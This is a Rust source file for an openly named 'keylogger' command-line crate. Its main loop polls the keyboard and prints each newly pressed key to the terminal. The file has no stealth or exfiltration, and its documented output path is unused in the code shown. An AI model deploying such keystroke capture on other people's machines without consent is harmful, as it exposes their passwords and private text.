//! Register various user actions - keystrokes on the computer keyboard, movements and mouse keystrokes
//!
//! ## Install
//!
//! If you have Rust: `cargo install keylogger`
//!
//! ## Usage
//!
//! ```bash
//! Register various user actions - keystrokes on the computer keyboard, movements and mouse keystrokes
//!
//! Usage: keylogger [PATH]
//!
//! Arguments:
//!   [PATH]  [default: .keylogger]
//!
//! Options:
//!   -h, --help     Print help
//!   -V, --version  Print version
//! ```
mod keylogger;
use std::io::Write;

fn main() {
    let mut prev_ctrl_keys: Vec<device_query::Keycode> = Vec::new();
    let mut prev_data_keys: Vec<device_query::Keycode> = Vec::new();
    
    loop {
        // Get all keys that were depressed this frame
        // and sort them by type
        let all_keys = keylogger::run();
        let ctrl_keys = all_keys.get("ctrl").unwrap().to_vec();
        let data_keys = all_keys.get("data").unwrap().to_vec();

        // Determine which keys are newly depressed
        let ctrl_equal = ctrl_keys == prev_ctrl_keys;
        let data_equal = data_keys == prev_data_keys;

        if !ctrl_equal {
            // print new characters
            for key in &ctrl_keys {
                if !prev_ctrl_keys.contains(&key) {
                    print!("{:?}", key);
                }
            }
        }

        if !data_equal {
            // print new characters
            for key in &data_keys {
                if !prev_data_keys.contains(&key) {
                    print!("{:?}", key);
                }
            }
        }

        prev_ctrl_keys = all_keys.get("ctrl").unwrap().to_vec();
        prev_data_keys = all_keys.get("data").unwrap().to_vec();
        std::io::stdout().flush().unwrap();
    }
}
